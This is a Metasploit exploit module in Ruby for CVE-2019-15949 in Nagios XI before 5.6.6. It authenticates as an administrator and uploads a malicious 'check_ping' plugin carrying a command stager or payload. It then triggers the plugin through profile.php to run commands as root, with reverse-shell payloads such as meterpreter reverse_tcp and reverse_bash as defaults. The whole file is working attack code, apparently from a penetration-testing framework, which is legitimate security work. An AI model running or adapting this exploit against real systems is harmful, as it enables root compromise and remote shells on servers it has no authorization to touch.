##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::NagiosXi
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Module::Deprecated
  moved_from 'exploit/linux/http/nagios_xi_authenticated_rce'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Nagios XI before 5.6.6 - Authenticated Remote Command Execution',
        'Description' => %q{
          This module exploits a vulnerability in Nagios XI before 5.6.6 in
          order to execute arbitrary commands as root.

          The module uploads a malicious plugin to the Nagios XI server and then
          executes this plugin by issuing an HTTP GET request to download a
          system profile from the server. For all supported targets except Linux
          (cmd), the module uses a command stager to write the exploit to the
          target via the malicious plugin. This may not work if Nagios XI is
          running in a restricted Unix environment, so in that case the target
          must be set to Linux (cmd). The module then writes the payload to the
          malicious plugin while avoiding commands that may not be supported.

          Valid credentials for a user with administrative privileges are
          required. This module was successfully tested on Nagios XI 5.6.5
          running on CentOS 7. The module may behave differently against older
          versions of Nagios XI. See the documentation for more information.
        },
        'License' => MSF_LICENSE,
        'Author' =>
          [
            'Jak Gibb',       # https://github.com/jakgibb/ - Discovery and exploit
            'Erik Wynter'     # @wyntererik - Metasploit
          ],
        'References' =>
          [
            ['CVE', '2019-15949'],
            ['URL', 'https://github.com/jakgibb/nagiosxi-root-rce-exploit'] # original PHP exploit
          ],
        'Payload' => { 'BadChars' => "\x00" },
        'Targets' =>
          [
            [
              'Linux (x86)', {
                'Arch' => ARCH_X86,
                'Platform' => 'linux',
                'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' }
              }
            ],
            [
              'Linux (x64)', {
                'Arch' => ARCH_X64,
                'Platform' => 'linux',
                'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' }
              }
            ],
            [
              'Linux (cmd)', {
                'Arch' => ARCH_CMD,
                'Platform' => 'unix',
                'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' },
                'Payload' => {
                  'Append' => ' & disown',  # the payload must be disowned after execution, otherwise cleanup fails
                  'BadChars' => '"'
                }
              }
            ]
          ],
        'Privileged' => true,
        'DisclosureDate' => '2019-07-29',
        'DefaultOptions' => { 'WfsDelay' => 10 }, # necessary because it always takes a while for the payload to connect back
        'DefaultTarget' => 1
      )
    )
    register_options [
      OptString.new('USERNAME', [true, 'Username to authenticate with', 'nagiosadmin']),
      OptString.new('PASSWORD', [true, 'Password to authenticate with', nil])
    ]
  end

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end

  def check
    # obtain cookies required for authentication
    cookies = nagios_xi_login(username, password)
    if cookies.instance_of? Msf::Exploit::CheckCode
      return cookies
    end

    # authenticate and obtain the Nagios XI version
    print_good('Successfully authenticated to Nagios XI')
    version = nagios_xi_version_index(cookies)
    if version.instance_of? Msf::Exploit::CheckCode
      return version
    end

    print_status("Target is Nagios XI with version #{version}")

    # check if the target is actually vulnerable
    unless Gem::Version.new(version) < Gem::Version.new('5.6.6')
      return Exploit::CheckCode::Safe
    end

    return Exploit::CheckCode::Appears
  end

  def grab_plugins_nsp
    # visit the plugins page to grab the nsp token required for uploadin the payload
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'admin', 'monitoringplugins.php'),
      'method' => 'GET'
    })

    unless res
      fail_with(Failure::Disconnected, "Connection failed while trying to visit `#{normalize_uri(target_uri.path, 'admin', 'monitoringplugins.php')}`")
    end

    unless res.code == 200 && res.body.include?('<title>Manage Plugins &middot; Nagios XI</title>')
      fail_with(Failure::UnexpectedReply, "Unexpected response received while trying to visit `#{normalize_uri(target_uri.path, 'admin', 'monitoringplugins.php')}`")
    end

    @nsp = get_nsp(res)

    if @nsp.blank?
      fail_with(Failure::Unknown, 'Failed to obtain the nsp token required to upload the payload')
    end
  end

  def execute_command(cmd, _opts = {})
    print_status("Uploading malicious 'check_ping' plugin...")
    post_data = Rex::MIME::Message.new
    post_data.add_part('1', nil, nil, 'form-data; name="upload"')
    post_data.add_part(@nsp, nil, nil, 'form-data; name="nsp"')
    post_data.add_part('20000000', nil, nil, 'form-data; name="MAX_FILE_SIZE"')
    post_data.add_part(cmd, 'text/plain', nil, 'form-data; name="uploadedfile"; filename="check_ping"')

    # upload payload
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'admin', 'monitoringplugins.php'),
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
      'data' => post_data.to_s
    })

    unless res
      fail_with Failure::Unreachable, 'Upload failed'
    end

    unless res.code == 200 && res.body.include?('New plugin was installed successfully')
      fail_with Failure::Unknown, 'Failed to upload plugin.'
    end

    @plugin_installed = true
  end

  # This request will timeout. It has to, for the exploit to work.
  def execute_payload
    print_status('Executing plugin...')
    send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'includes', 'components', 'profile', 'profile.php'),
      'method' => 'GET',
      'vars_get' => { 'cmd' => 'download' }
    }, 0)
  end

  def cleanup
    return unless @plugin_installed

    print_status("Deleting malicious 'check_ping' plugin...")
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'admin', 'monitoringplugins.php'),
      'method' => 'GET',
      'vars_get' => {
        'delete' => 'check_ping',
        'nsp' => @nsp
      }
    })

    unless res
      print_warning("Failed to delete the malicious 'check_ping' plugin: Connection failed. Manual cleanup is required.")
      return
    end

    unless res.code == 200 && res.body.include?('Plugin deleted')
      print_warning("Failed to delete the malicious 'check_ping' plugin. Manual cleanup is required.")
      return
    end

    print_good('Plugin deleted.')
  end

  def exploit
    grab_plugins_nsp

    if target.arch.first == ARCH_CMD
      execute_command(payload.encoded)
      message = 'Waiting for the payload to connect back...'
    else
      execute_cmdstager(background: true)
      message = 'Waiting for the plugin to request the final payload...'
    end
    print_good('Successfully uploaded plugin.')
    execute_payload
    print_status(message)
  end
end
